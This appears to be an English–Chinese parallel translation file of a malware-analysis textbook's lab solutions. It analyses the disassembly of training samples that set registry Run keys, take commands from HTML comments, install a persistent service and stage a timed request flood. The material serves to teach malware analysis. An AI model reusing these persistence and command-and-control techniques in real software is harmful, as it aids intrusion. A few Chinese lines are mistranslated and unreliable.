  zh: arg_0是IDA Pro的一个自动标签，它列出了调用之前的最后一个参数；因此，arg_0是从互联网获取的解析命令字符。解析命令字符被移动到var_8，并最终加载到ECX中。下一条指令从ECX中减去0x61（ASCII中的字母*a*）。因此，一旦这条指令执行，当arg_0等于*a*时，ECX将等于0。
- en: Next, a comparison to the number 4 at  checks to see if the command character
    (arg_0) is a, b, c, d, or e. Any other result will force the ja instruction to
    leave this section of code. Otherwise, we see the parsed command character used
    as an index into the jump table at .
  id: totrans-1496
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，一个比较数字4的指令检查命令字符（arg_0）是否为a、b、c、d或e。任何其他结果都将强制ja指令离开这段代码。否则，我们看到解析命令字符被用作跳转表的索引。
- en: The EDX is multiplied by 4 at  because the jump table is a set of memory addresses
    referencing the different possible paths, and each memory address is 4 bytes in
    size. The jump table at  has five entries, as expected. A jump table like this
    is often used by a compiler when generating assembly for a switch statement, as
    described in Chapter 6\.
  id: totrans-1497
  prefs: []
  type: TYPE_NORMAL
  zh: 在处，EDX被乘以4，因为跳转表是一组引用不同可能路径的内存地址，每个内存地址的大小为4字节。在处的跳转表有五个条目，正如预期的那样。这样的跳转表通常在编译器生成switch语句的汇编代码时使用，如第6章所述。
- en: '**Graphical View of Command Character Switch**'
  id: totrans-1498
  prefs: []
  type: TYPE_NORMAL
  zh: '**命令字符切换的图形视图**'
- en: Now let’s look at the graphical view of this function, as shown in Figure 6-3L.
  id: totrans-1499
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们来看看这个函数的图形视图，如图6-3L所示。
- en: We see six possible paths through the code, including five cases and the default.
    The “jump above 4” instruction takes us down the default path; otherwise, the
    jump table causes an execution path of the a through e branches. When you see
    a graph like the one in the figure (a single box going to many different boxes),
    you should suspect a switch statement. You can confirm that suspicion by looking
    at the code logic and jump table.
  id: totrans-1500
  prefs: []
  type: TYPE_NORMAL
  zh: 我们看到有六种可能的代码路径，包括五个情况和默认情况。“跳过4以上”指令将我们引向默认路径；否则，跳转表将导致a到e分支的执行路径。当你看到图中的图形（一个盒子通向许多不同的盒子）时，你应该怀疑这是一个switch语句。你可以通过查看代码逻辑和跳转表来证实这个怀疑。
- en: Solutions to Labs
  id: totrans-1501
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**509**'
  id: totrans-1502
  prefs: []
  type: TYPE_NORMAL
  zh: '**509**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1503
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 112](index-543_1.png)'
  id: totrans-1504
  prefs: []
  type: TYPE_IMG
  zh: '![图像112](index-543_1.png)'
- en: '*Figure 6-3L: The switch statement from function 0x401130 shown in graphical
    mode,* *labeled with the switch options*'
  id: totrans-1505
  prefs: []
  type: TYPE_NORMAL
  zh: '*图6-3L：以图形模式显示的函数0x401130中的switch语句，标记有switch选项*'
- en: '**Switch Options**'
  id: totrans-1506
  prefs: []
  type: TYPE_NORMAL
  zh: '**switch选项**'
- en: Next, we will examine each of the switch options (a through e) individually.
  id: totrans-1507
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将分别检查每个switch选项（a到e）。
- en: 
  id: totrans-1508
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: The a option calls CreateDirectory with the parameter C:\\Temp, to create the
    path if it doesn’t already exist.
  id: totrans-1509
  prefs: []
  type: TYPE_NORMAL
  zh: a选项使用参数C:\\Temp调用CreateDirectory，以创建如果不存在的话的路径。
- en: 
  id: totrans-1510
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: 'The b option calls CopyFile, which takes two parameters: a source and a destination
    file. The destination is C:\\Temp\\cc.exe. The source is a parameter passed to
    this function, which, based on our earlier analysis, we know to be the program
    name (Argv[0]). Therefore, this option would copy *Lab06-03.exe* to *C:\Temp\cc.exe*.'
  id: totrans-1511
  prefs: []
  type: TYPE_NORMAL
  zh: b选项调用CopyFile，它接受两个参数：源文件和目标文件。目标文件是C:\\Temp\\cc.exe。源文件是传递给此函数的参数，根据我们之前的分析，我们知道它是程序名称（Argv[0]）。因此，此选项会将*Lab06-03.exe*复制到*C:\Temp\cc.exe*。
- en: 
  id: totrans-1512
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: The c option calls DeleteFile with the parameter C:\\Temp\\cc.exe, which deletes
    that file if it exists.
  id: totrans-1513
  prefs: []
  type: TYPE_NORMAL
  zh: c选项使用参数C:\\Temp\\cc.exe调用DeleteFile，如果该文件存在，则删除该文件。
- en: 
  id: totrans-1514
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: The d option sets a value in the Windows registry for persistence. Specifically,
    it sets Software\Microsoft\Windows\CurrentVersion\Run\Malware to *C:\Temp\cc.exe*,
    which makes the malware start at system boot (if it is first copied to the *Temp*
    location).
  id: totrans-1515
  prefs: []
  type: TYPE_NORMAL
  zh: d选项在Windows注册表中设置一个值以实现持久性。具体来说，它将Software\Microsoft\Windows\CurrentVersion\Run\Malware设置为*C:\Temp\cc.exe*，这使得恶意软件在系统启动时启动（如果它首先被复制到*Temp*位置）。
- en: 
  id: totrans-1516
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: The e option sleeps for 100 seconds.
  id: totrans-1517
  prefs: []
  type: TYPE_NORMAL
  zh: e选项暂停100秒。
- en: 
  id: totrans-1518
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: 'Finally, the default option prints “Error 3.2: Not a valid command provided.”'
  id: totrans-1519
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，默认选项打印“错误3.2：未提供有效的命令。”
- en: Having analyzed this function fully, we can combine it with our analysis from
    Lab 6-2 to gain a strong understanding of how the overall program operates.
  id: totrans-1520
  prefs: []
  type: TYPE_NORMAL
  zh: 完全分析了这个函数后，我们可以将其与我们的6-2实验室分析结合起来，以深入了解整个程序的操作方式。
- en: 'We now know that the program checks for an active Internet connection using
    the if construct. If there is no valid Internet connection, the program terminates.
    Otherwise, the program attempts to download a web page that contains an embedded
    HTML comment starting with <!--. The next character is parsed from this comment
    and used in a switch statement to determine which action to take on the local
    system: delete a file, create a directory, set a registry run key, copy a file,
    or sleep for 100 seconds.'
  id: totrans-1521
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在知道程序使用if构造检查活动互联网连接。如果没有有效的互联网连接，程序将终止。否则，程序尝试下载包含以<!--开始的嵌入式HTML注释的网页。从这个注释中解析出的下一个字符用于switch语句，以确定在本地系统上采取的操作：删除文件、创建目录、设置注册表运行键、复制文件或暂停100秒。
- en: '**510**'
  id: totrans-1522
  prefs: []
  type: TYPE_NORMAL
  zh: '**510**'
- en: Appendix C
  id: totrans-1523
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1524
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Lab 6-4 Solutions**'
  id: totrans-1525
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验室6-4解决方案**'
- en: '***Short Answers***'
  id: totrans-1526
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短答案***'
- en: 1\.
  id: totrans-1527
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: The function at 0x401000 is the check Internet connection method, 0x401040 is
    the parse HTML method, 0x4012B5 is printf, and 0x401150
  id: totrans-1528
  prefs: []
  type: TYPE_NORMAL
  zh: 0x401000处的函数是检查互联网连接方法，0x401040是解析HTML方法，0x4012B5是printf，0x401150是switch语句。
- en: is the switch statement.
  id: totrans-1529
  prefs: []
  type: TYPE_NORMAL
  zh: 是switch语句。
- en: 2\.
  id: totrans-1530
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: A for loop has been added to the main method.
  id: totrans-1531
  prefs: []
  type: TYPE_NORMAL
  zh: 在主方法中添加了一个for循环。
- en: 3\.
  id: totrans-1532
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: The function at 0x401040 now takes a parameter and calls sprintf with **6**
  id: totrans-1533
  prefs: []
  type: TYPE_NORMAL
  zh: 现在位于0x401040的函数接受一个参数，并使用**6**调用sprintf。
- en: the format string Internet Explorer 7.50/pma%d. It builds a User-Agent for use
    during HTTP communication using the argument passed in.
  id: totrans-1534
  prefs: []
  type: TYPE_NORMAL
  zh: 格式字符串为Internet Explorer 7.50/pma%d。它使用传入的参数构建一个用于HTTP通信期间使用的User-Agent。
- en: 4\.
  id: totrans-1535
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: This program will run for 1440 minutes (24 hours).
  id: totrans-1536
  prefs: []
  type: TYPE_NORMAL
  zh: 这个程序将运行1440分钟（24小时）。
- en: 5\.
  id: totrans-1537
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: Yes, a new User-Agent is used. It takes the form Internet Explorer 7.50/
  id: totrans-1538
  prefs: []
  type: TYPE_NORMAL
  zh: 是的，使用了新的User-Agent。它的形式是Internet Explorer 7.50/
- en: pma%d, where %d is the number of minutes the program has been running.
  id: totrans-1539
  prefs: []
  type: TYPE_NORMAL
  zh: pma%d，其中%d是程序运行的时间（分钟数）。
- en: 6\.
  id: totrans-1540
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: First, the program checks for an active Internet connection. If none is found,
    the program terminates. Otherwise, the program will use a unique User-Agent to
    attempt to download a web page containing a counter that tracks the number of
    minutes the program has been running. The web page downloaded contains an embedded
    HTML comment starting with <!--. The next character is parsed from this comment
    and used in a switch statement to determine the action to take on the local system.
    These are hard-coded actions, including deleting a file, creating a directory,
    setting a registry run key, copying a file, and sleeping for 100 seconds. This
    program will run for 24 hours before terminating.
  id: totrans-1541
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，程序检查是否存在活动的互联网连接。如果没有找到，程序将终止。否则，程序将使用一个独特的User-Agent尝试下载包含计数器的网页，该计数器跟踪程序运行的时间（分钟数）。下载的网页包含一个以<!--开始的嵌入式HTML注释。从这个注释中解析出的下一个字符用于switch语句，以确定在本地系统上要采取的操作。这些是硬编码的操作，包括删除文件、创建目录、设置注册表运行键、复制文件和睡眠100秒。该程序将在24小时后终止。
- en: '***Detailed Analysis***'
  id: totrans-1542
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: 'We begin by performing basic static analysis on the binary. We see one new
    string of interest that was not in Lab 6-3, as follows:'
  id: totrans-1543
  prefs: []
  type: TYPE_NORMAL
  zh: 我们首先对二进制文件进行基本静态分析。我们看到一个有趣的字符串，它不在第6-3实验室中，如下所示：
- en: Internet Explorer 7.50/pma%d
  id: totrans-1544
  prefs: []
  type: TYPE_NORMAL
  zh: Internet Explorer 7.50/pma%d
- en: It looks like this program may use a dynamically generated User-Agent.
  id: totrans-1545
  prefs: []
  type: TYPE_NORMAL
  zh: 看起来这个程序可能使用动态生成的User-Agent。
- en: Looking at the imports, we don’t see any Windows API functions that were not
    in Lab 6-3\. When performing dynamic analysis, we also notice this User-Agent
    change when we see Internet Explorer 7.50/pma0\.
  id: totrans-1546
  prefs: []
  type: TYPE_NORMAL
  zh: 查看导入项，我们没有看到第6-3实验室中没有的任何Windows API函数。在执行动态分析时，我们注意到当看到Internet Explorer 7.50/pma0时，这个User-Agent发生了变化。
- en: Next, we perform more in-depth analysis with disassembly. We load the executable
    into IDA Pro and look at the main method, which is clearly struc-turally different
    from main in Lab 6-3, although many of the same functions are called. We see the
    functions 0x401000 (check Internet connection method), 0x401040 (parse HTML method),
    0x4012B5 as printf, and 0x401150 (the switch statement). You should rename these
    functions as such in IDA Pro to make them easier to analyze.
  id: totrans-1547
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们使用反汇编进行更深入的分析。我们将可执行文件加载到IDA Pro中，查看主方法，它与第6-3实验室中的main方法在结构上明显不同，尽管调用了许多相同的函数。我们看到函数0x401000（检查互联网连接方法）、0x401040（解析HTML方法）、0x4012B5（printf）和0x401150（switch语句）。您应该在IDA
    Pro中将这些函数重命名为这样，以便更容易分析。
- en: Looking at the main method in IDA Pro’s graphical view mode, we see an upward-facing
    arrow, which signifies looping. Listing 6-9L shows the loop structure.
  id: totrans-1548
  prefs: []
  type: TYPE_NORMAL
  zh: 在IDA Pro的图形视图模式下查看主方法，我们看到一个向上的箭头，这表示循环。列表6-9L显示了循环结构。
- en: Solutions to Labs
  id: totrans-1549
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**511**'
  id: totrans-1550
  prefs: []
  type: TYPE_NORMAL
  zh: '**511**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1551
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 00401248 loc_401248
  id: totrans-1552
  prefs: []
  type: TYPE_NORMAL
  zh: 00401248 loc_401248
- en: 00401248 mov [ebp+var_C], 0 
  id: totrans-1553
  prefs: []
  type: TYPE_NORMAL
  zh: 00401248 mov [ebp+var_C], 0 
- en: 0040124F jmp short loc_40125A
  id: totrans-1554
  prefs: []
  type: TYPE_NORMAL
  zh: 0040124F jmp short loc_40125A
- en: '00401251 loc_401251:'
  id: totrans-1555
  prefs: []
  type: TYPE_NORMAL
  zh: '00401251 loc_401251:'
- en: 00401251 mov eax, [ebp+var_C]
  id: totrans-1556
  prefs: []
  type: TYPE_NORMAL
  zh: 00401251 mov eax, [ebp+var_C]
- en: 00401254 add eax, 1 
  id: totrans-1557
  prefs: []
  type: TYPE_NORMAL
  zh: 00401254 add eax, 1 
- en: 00401257 mov [ebp+var_C], eax
  id: totrans-1558
  prefs: []
  type: TYPE_NORMAL
  zh: 00401257 mov [ebp+var_C], eax
- en: '0040125A loc_40125A:'
  id: totrans-1559
  prefs: []
  type: TYPE_NORMAL
  zh: '0040125A loc_40125A:'
- en: 0040125A cmp [ebp+var_C], 5A0h 
  id: totrans-1560
  prefs: []
  type: TYPE_NORMAL
  zh: 0040125A cmp [ebp+var_C], 5A0h 
- en: 00401261 jge short loc_4012AF
  id: totrans-1561
  prefs: []
  type: TYPE_NORMAL
  zh: 00401261 jge short loc_4012AF
- en: 00401263 mov ecx, [ebp+var_C] 
  id: totrans-1562
  prefs: []
  type: TYPE_NORMAL
  zh: 00401263 mov ecx, [ebp+var_C] 
- en: 00401266 push ecx
  id: totrans-1563
  prefs: []
  type: TYPE_NORMAL
  zh: 00401266 push ecx
- en: 00401267 call sub_401040
  id: totrans-1564
  prefs: []
  type: TYPE_NORMAL
  zh: 00401267 call sub_401040
- en: '...'
  id: totrans-1565
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 004012A2 push 60000
  id: totrans-1566
  prefs: []
  type: TYPE_NORMAL
  zh: 004012A2 push 60000
- en: 004012A7 call ds:Sleep
  id: totrans-1567
  prefs: []
  type: TYPE_NORMAL
  zh: 004012A7 call ds:Sleep
- en: 004012AD jmp short loc_401251 
  id: totrans-1568
  prefs: []
  type: TYPE_NORMAL
  zh: 004012AD jmp short loc_401251 
- en: '*Listing 6-9L: The loop structure*'
  id: totrans-1569
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表6-9L：循环结构*'
- en: The variable var_C is the local variable used for the loop counter. The counter
    is initialized to 0 at , jumps past the incrementing at , performs a check at
    , and loops back to the incrementor when it gets to . The presence of these
    four code sections tells us that we are looking at a for loop code construct.
    If the var_C (counter) is greater than or equal to 0x5A0 (1440), the loop will
    end. Otherwise, the code starting at  is executed. The code pushes var_C on the
    stack before calling 0x401040, and then sleeps for 1 minute before looping up
    at  and incrementing the counter by one. Therefore, this process will repeat
    for 1440 minutes, which is equal to 24 hours.
  id: totrans-1570
  prefs: []
  type: TYPE_NORMAL
  zh: 变量var_C是用于循环计数的局部变量。计数器在处初始化为0，跳过增量操作在处，在处执行检查，并在到达处时返回增量器。这四个代码部分的存在告诉我们我们正在查看一个for循环代码结构。如果var_C（计数器）大于或等于0x5A0（1440），循环将结束。否则，从开始的代码将被执行。在调用0x401040之前，代码将var_C压入栈中，然后睡眠1分钟，再在处循环并增加计数器。因此，这个过程将重复1440分钟，即24小时。
- en: In previous labs, 0x401040 did not take a parameter, so we need to investigate
    this further. Listing 6-10L shows the start of 0x401040\.
  id: totrans-1571
  prefs: []
  type: TYPE_NORMAL
  zh: 在之前的实验中，0x401040没有接受参数，因此我们需要进一步调查。列表6-10L显示了0x401040的开始。
- en: 00401049 mov eax, [ebp+arg_0]
  id: totrans-1572
  prefs: []
  type: TYPE_NORMAL
  zh: 00401049 mov eax, [ebp+arg_0]
- en: 0040104C push eax 
  id: totrans-1573
  prefs: []
  type: TYPE_NORMAL
  zh: 0040104C push eax 
- en: 0040104D push offset aInt ; "Internet Explorer 7.50/pma%d"
  id: totrans-1574
  prefs: []
  type: TYPE_NORMAL
  zh: 0040104D push offset aInt ; "Internet Explorer 7.50/pma%d"
- en: 00401052 lea ecx, [ebp+szAgent]
  id: totrans-1575
  prefs: []
  type: TYPE_NORMAL
  zh: 00401052 lea ecx, [ebp+szAgent]
- en: 00401055 push ecx ; char *
  id: totrans-1576
  prefs: []
  type: TYPE_NORMAL
  zh: 00401055 push ecx ; char *
- en: 00401056 call _sprintf
  id: totrans-1577
  prefs: []
  type: TYPE_NORMAL
  zh: 00401056 call _sprintf
- en: 0040105B add esp, 0Ch
  id: totrans-1578
  prefs: []
  type: TYPE_NORMAL
  zh: 0040105B add esp, 0Ch
- en: 0040105E push 0 ; dwFlags
  id: totrans-1579
  prefs: []
  type: TYPE_NORMAL
  zh: 0040105E push 0 ; dwFlags
- en: 00401060 push 0 ; lpszProxyBypass
  id: totrans-1580
  prefs: []
  type: TYPE_NORMAL
  zh: 00401060 push 0 ; lpszProxyBypass
- en: 00401062 push 0 ; lpszProxy
  id: totrans-1581
  prefs: []
  type: TYPE_NORMAL
  zh: 00401062 push 0 ; lpszProxy
- en: 00401064 push 0 ; dwAccessType
  id: totrans-1582
  prefs: []
  type: TYPE_NORMAL
  zh: 00401064 push 0 ; dwAccessType
- en: 00401066 lea edx, [ebp+szAgent] 
  id: totrans-1583
  prefs: []
  type: TYPE_NORMAL
  zh: 00401066 lea edx, [ebp+szAgent] 
- en: 00401069 push edx ; lpszAgent
  id: totrans-1584
  prefs: []
  type: TYPE_NORMAL
  zh: 00401069 push edx ; lpszAgent
- en: 0040106A call ds:InternetOpenA
  id: totrans-1585
  prefs: []
  type: TYPE_NORMAL
  zh: 0040106A call ds:InternetOpenA
- en: '*Listing 6-10L: The function at 0x401040*'
  id: totrans-1586
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表6-10L：0x401040处的函数*'
- en: '**512**'
  id: totrans-1587
  prefs: []
  type: TYPE_NORMAL
  zh: '**512**'
- en: Appendix C
  id: totrans-1588
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1589
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Here, arg_0 is the only parameter, and main is the only method calling 0x401040,
    so we conclude that arg_0 is always the counter (var_C) from the main method.
    Arg_0 is pushed on the stack at , along with a format string and a destination.
    We also see that sprintf is called, which creates the string and stores it in
    the destination buffer, the local variable labeled szAgent. And szAgent is passed
    to InternetOpenA at , which means that every time the counter increases, the
    User-Agent will change. This mechanism can be used by an attacker managing and
    monitoring a web server to track how long the malware has been running.
  id: totrans-1590
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里，arg_0是唯一的参数，main是唯一调用0x401040的方法，因此我们得出结论，arg_0始终是从main方法中来的计数器（var_C）。Arg_0在处压入栈中，同时还有一个格式字符串和一个目的地。我们还看到调用了sprintf，它创建了一个字符串并将其存储在目的地缓冲区中，即本地变量szAgent。然后szAgent在处传递给InternetOpenA，这意味着每次计数器增加时，User-Agent都会改变。这种机制可以被攻击者用来管理和监控Web服务器，以追踪恶意软件运行了多久。
- en: To summarize, the program checks for an active Internet connection using the
    if construct. If no connection is found, the program terminates.
  id: totrans-1591
  prefs: []
  type: TYPE_NORMAL
  zh: 总结来说，程序使用if构造检查是否有活跃的互联网连接。如果没有找到连接，程序将终止。
- en: Otherwise, the program uses a unique User-Agent to attempt to download a **7**
  id: totrans-1592
  prefs: []
  type: TYPE_NORMAL
  zh: 否则，程序使用唯一的User-Agent尝试下载一个**7**
- en: web page containing a counter from a for loop construct. This counter contains
    the number of minutes the program has been running. The web page contains an embedded
    HTML comment and is read into an array construct of characters and compared to
    <!--. The next character is parsed from this comment and used in a switch construct
    to determine what action to take on the local system. These are hard-coded actions,
    including deleting a file, creating a directory, setting a registry run key, copying
    a file, and sleeping for 100 seconds. This program will run for 1440 minutes (24
    hours) before terminating.
  id: totrans-1593
  prefs: []
  type: TYPE_NORMAL
  zh: 包含来自for循环构造的计数器的网页。这个计数器包含了程序运行了多少分钟的数字。网页包含一个嵌入的HTML注释，并被读入一个字符数组构造中，并与<!--进行比较。从这个注释中解析出的下一个字符被用于switch构造，以确定在本地系统上要采取什么操作。这些是硬编码的操作，包括删除文件、创建目录、设置注册表运行键、复制文件和睡眠100秒。这个程序将在运行1440分钟（24小时）后终止。
- en: '**Lab 7-1 Solutions**'
  id: totrans-1594
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验7-1 解答**'
- en: '***Short Answers***'
  id: totrans-1595
  prefs: []
  type: TYPE_NORMAL
  zh: '***简答题***'
- en: 1\.
  id: totrans-1596
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: This program creates the service MalService to ensure that it runs every time
    the computer is started.
  id: totrans-1597
  prefs: []
  type: TYPE_NORMAL
  zh: 这个程序创建服务MalService以确保每次计算机启动时它都会运行。
- en: 2\.
  id: totrans-1598
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: The program uses a mutex to ensure that only one copy of the program is running
    at a time.
  id: totrans-1599
  prefs: []
  type: TYPE_NORMAL
  zh: 程序使用互斥锁确保一次只运行一个程序副本。
- en: 3\.
  id: totrans-1600
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: We could search for a mutex named HGL345 and for the service MalService.
  id: totrans-1601
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以搜索名为HGL345的互斥锁和名为MalService的服务。
- en: 4\.
  id: totrans-1602
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: The malware uses the user-agent Internet Explorer 8.0 and communicates with
    *www.malwareanalysisbook.com*.
  id: totrans-1603
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件使用用户代理Internet Explorer 8.0并与*www.malwareanalysisbook.com*通信。
- en: 5\.
  id: totrans-1604
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: This program waits until midnight on January 1, 2100, and then sends many requests
    to *http://www.malwareanalysisbook.com/*, presumably to conduct a distributed
    denial-of-service (DDoS) attack against the site.
  id: totrans-1605
  prefs: []
  type: TYPE_NORMAL
  zh: 这个程序等待到2100年1月1日的午夜，然后向*http://www.malwareanalysisbook.com/*发送许多请求，可能是在对该网站进行分布式拒绝服务（DDoS）攻击。
- en: 6\.
  id: totrans-1606
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: This program will never finish. It waits on a timer until the year 2100, and
    then creates 20 threads, each of which runs in an infinite loop.
  id: totrans-1607
  prefs: []
  type: TYPE_NORMAL
  zh: 这个程序永远不会结束。它等待定时器直到2100年，然后创建20个线程，每个线程都在一个无限循环中运行。
- en: '***Detailed Analysis***'
  id: totrans-1608
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: The first step in analyzing this malware in depth is to open it with IDA Pro
    or a similar tool to examine the imported function list. Many functions in the
    list provide little information because they are commonly imported by Solutions
    to Labs
  id: totrans-1609
  prefs: []
  type: TYPE_NORMAL
  zh: 深入分析这种恶意软件的第一步是使用IDA Pro或类似工具打开它，以检查导入的函数列表。列表中的许多函数提供的信息很少，因为它们通常由Solutions
    to Labs导入。
- en: '**513**'
  id: totrans-1610
  prefs: []
  type: TYPE_NORMAL
  zh: '**513**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1611
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: all Windows executables, but a few stand out. Specifically OpenSCManager and
    CreateService indicate that this malware probably creates a service to ensure
    that it will run when the computer is restarted.
  id: totrans-1612
  prefs: []
  type: TYPE_NORMAL
  zh: 所有Windows可执行文件，但有一些突出。具体来说，OpenSCManager和CreateService表明这种恶意软件可能创建一个服务以确保在计算机重启时运行。
- en: The import of StartServiceCtrlDispatcherA hints that this file actually is a
    service. The calls to InternetOpen and InternetOpenUrl tell us that this program
    might connect to a URL to download content.
  id: totrans-1613
  prefs: []
  type: TYPE_NORMAL
  zh: StartServiceCtrlDispatcherA的导入暗示这个文件实际上是一个服务。对InternetOpen和InternetOpenUrl的调用告诉我们，这个程序可能连接到URL以下载内容。
- en: Next, we jump to the main function, which IDA Pro has identified and labeled
    _wmain at location 0x401000\. A quick glance at the code shows that it’s short
    enough to analyze completely. The _wmain function calls only one other function,
    as shown in the following listing. If the code were longer, we would need to focus
    on only the most interesting function calls based on our review of the import
    table.
  id: totrans-1614
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们跳转到主函数，IDA Pro已将其标识并标记为_wmain，位置在0x401000。快速浏览代码显示它足够短，可以完全分析。_wmain函数只调用另一个函数，如下所示。如果代码更长，我们只需根据导入表审查，关注最有趣的函数调用。
- en: 00401003 lea eax, [esp+10h+ServiceStartTable]
  id: totrans-1615
  prefs: []
  type: TYPE_NORMAL
  zh: 00401003 lea eax, [esp+10h+ServiceStartTable]
- en: 00401007 mov [esp+10h+ServiceStartTable.lpServiceName], offset aMalservice ;
    "MalService"
  id: totrans-1616
  prefs: []
  type: TYPE_NORMAL
  zh: 00401007 mov [esp+10h+ServiceStartTable.lpServiceName], offset aMalservice ;
    "MalService"
- en: 0040100F push eax ; lpServiceStartTable
  id: totrans-1617
  prefs: []
  type: TYPE_NORMAL
  zh: 0040100F push eax ; lpServiceStartTable
- en: 00401010 mov [esp+14h+ServiceStartTable.lpServiceProc], offset sub_401040
  id: totrans-1618
  prefs: []
  type: TYPE_NORMAL
  zh: 00401010 mov [esp+14h+ServiceStartTable.lpServiceProc], offset sub_401040
- en: 00401018 mov [esp+14h+var_8], 0
  id: totrans-1619
  prefs: []
  type: TYPE_NORMAL
  zh: 00401018 mov [esp+14h+var_8], 0
- en: 00401020 mov [esp+14h+var_4], 0
  id: totrans-1620
  prefs: []
  type: TYPE_NORMAL
  zh: 00401020 mov [esp+14h+var_4], 0
- en: 00401028 call ds:StartServiceCtrlDispatcherA
  id: totrans-1621
  prefs: []
  type: TYPE_NORMAL
  zh: 00401028 call ds:StartServiceCtrlDispatcherA
- en: 0040102E push 0
  id: totrans-1622
  prefs: []
  type: TYPE_NORMAL
  zh: 0040102E push 0
- en: 00401030 push 0
  id: totrans-1623
  prefs: []
  type: TYPE_NORMAL
  zh: 00401030 push 0
- en: 00401032 call sub_401040
  id: totrans-1624
  prefs: []
  type: TYPE_NORMAL
  zh: 00401032 call sub_401040
- en: This code begins with a call to StartServiceCtrlDispatcherA at . According
    to the MSDN documentation, this function is used by a program to implement a service,
    and it is usually called immediately. The function specifies the service control
    function that the service control manager will call. Here, it specifies sub_401040
    at , which will be called after the call to StartServiceCtrlDispatcherA.
  id: totrans-1625
  prefs: []
  type: TYPE_NORMAL
  zh: 这段代码以对StartServiceCtrlDispatcherA的调用开始。根据MSDN文档，该函数由程序用于实现服务，通常立即调用。该函数指定服务控制管理器将调用的服务控制函数。在这里，它指定sub_401040，在调用StartServiceCtrlDispatcherA之后将被调用。
- en: This first portion of code, including the call to StartServiceCtrlDispatcherA,
    is bookkeeping code that is necessary for programs that are run as services. It
    doesn’t tell us what the program is doing, but it does tell us that it expects
    to be run as a service.
  id: totrans-1626
  prefs: []
  type: TYPE_NORMAL
  zh: 这段代码的第一部分，包括对StartServiceCtrlDispatcherA的调用，是作为服务运行的程序所需的账单代码。它没有告诉我们程序在做什么，但它确实告诉我们它期望作为服务运行。
- en: Next, we examine the sub_401040 function, as shown in the following listing.
  id: totrans-1627
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们检查sub_401040函数，如下所示。
- en: 00401040 sub esp, 400h
  id: totrans-1628
  prefs: []
  type: TYPE_NORMAL
  zh: 00401040 sub esp, 400h
- en: 00401046 push offset Name ; "HGL345"
  id: totrans-1629
  prefs: []
  type: TYPE_NORMAL
  zh: 00401046 push offset Name ; "HGL345"
- en: 0040104B push 0 ; bInheritHandle
  id: totrans-1630
  prefs: []
  type: TYPE_NORMAL
  zh: 0040104B push 0 ; bInheritHandle
- en: 0040104D push 1F0001h ; dwDesiredAccess
  id: totrans-1631
  prefs: []
  type: TYPE_NORMAL
  zh: 0040104D push 1F0001h ; dwDesiredAccess
- en: 00401052 call ds:OpenMutexA
  id: totrans-1632
  prefs: []
  type: TYPE_NORMAL
  zh: 00401052 call ds:OpenMutexA
- en: 00401058 test eax, eax
  id: totrans-1633
  prefs: []
  type: TYPE_NORMAL
  zh: 00401058 test eax, eax
- en: 0040105A jz short loc_401064
  id: totrans-1634
  prefs: []
  type: TYPE_NORMAL
  zh: 0040105A jz short loc_401064
- en: 0040105C push 0 ; uExitCode
  id: totrans-1635
  prefs: []
  type: TYPE_NORMAL
  zh: 0040105C push 0 ; uExitCode
- en: 0040105E call ds:ExitProcess
  id: totrans-1636
  prefs: []
  type: TYPE_NORMAL
  zh: 0040105E call ds:ExitProcess
